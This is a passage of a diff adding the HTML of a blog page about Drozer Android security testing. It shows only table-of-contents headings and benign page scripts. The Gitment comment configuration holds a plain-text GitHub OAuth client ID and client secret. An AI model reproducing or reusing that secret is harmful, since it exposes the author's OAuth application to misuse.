href="#8-2%E3%80%81%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="toc-nav-number">9.2.</span> <span class="toc-nav-text">8.2、目录遍历</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#8-3%E3%80%81%E8%AF%BB%E5%8F%96%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF"><span class="toc-nav-number">9.3.</span> <span class="toc-nav-text">8.3、读取敏感信息</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#8-4%E3%80%81%E8%87%AA%E5%8A%A8%E6%A3%80%E6%B5%8B"><span class="toc-nav-number">9.4.</span> <span class="toc-nav-text">8.4、自动检测</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#9%E3%80%81Services"><span class="toc-nav-number">10.</span> <span class="toc-nav-text">9、Services</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#10%E3%80%81Broadcast"><span class="toc-nav-number">11.</span> <span class="toc-nav-text">10、Broadcast</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#11%E3%80%81Vul%E5%AE%9E%E6%88%98"><span class="toc-nav-number">12.</span> <span class="toc-nav-text">11、Vul实战</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#12%E3%80%81%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1"><span class="toc-nav-number">13.</span> <span class="toc-nav-text">12、拒绝服务</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#WebView%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%A3%80%E6%B5%8B"><span class="toc-nav-number"></span> <span class="toc-nav-text">WebView代码执行检测</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-nav-number"></span> <span class="toc-nav-text">总结</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E5%8F%82%E8%80%83"><span class="toc-nav-number"></span> <span class="toc-nav-text">参考</span></a>
+    
+  </div>
+</aside>
+
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://example.com/2020/06/20/Drozer检测学习/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', 'http://file.muyutech.com/error-img.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== 'http://file.muyutech.com/error-img.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+  <script>
+    var qr = new QRious({
+      element: document.getElementById('share-qrcode'),
+      value: document.location.href
+    });
+  </script>
+
+
+
+  <script>
+    var gitmentConfig = "si1ent";
+    if (gitmentConfig !== 'undefined') {
+      var gitment = new Gitment({
+        id: "Drozer检测学习",
+        owner: "si1ent",
+        repo: "",
+        oauth: {
+          client_id: "0f87e490e00ee3fd87ef",
+          client_secret: "4a9d2b148e7971c2201ad12131ce8bf8159ccd2e"
+        },
+        theme: {
+          render(state, instance) {
+            const container = document.createElement('div')
+            container.lang = "en-US"
+            container.className = 'gitment-container gitment-root-container'
+            container.appendChild(instance.renderHeader(state, instance))
+            container.appendChild(instance.renderEditor(state, instance))
+            container.appendChild(instance.renderComments(state, instance))
+            container.appendChild(instance.renderFooter(state, instance))
+            return container;
+          }
+        }
+      })
+      gitment.render(document.getElementById('comments'))
+    }
+  </script>
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <footer class="app-footer">
+  <p class="copyright">
+    &copy; 2020 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    </p>
+    <p class="copyright">
+    皖ICP备19004273
+  </p>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
